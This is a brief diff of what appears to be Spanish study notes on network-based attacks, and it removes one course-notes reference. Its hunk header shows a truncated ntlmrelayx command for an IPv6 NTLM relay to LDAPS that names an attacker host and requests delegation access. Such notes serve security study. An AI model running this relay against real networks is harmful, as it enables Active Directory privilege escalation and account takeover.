@@ -41,4 +41,3 @@ sudo ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh attacker-v6-host --delegate-ac
 ## Referencias
 - Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
 - MITRE Corporation. (2024). ATT&CK Technique T1557: Adversary-in-the-Middle. https://attack.mitre.org/techniques/T1557/
-- Notas del proyecto: notas-md/INE Courses/INE Courses/Network Based Attacks.md
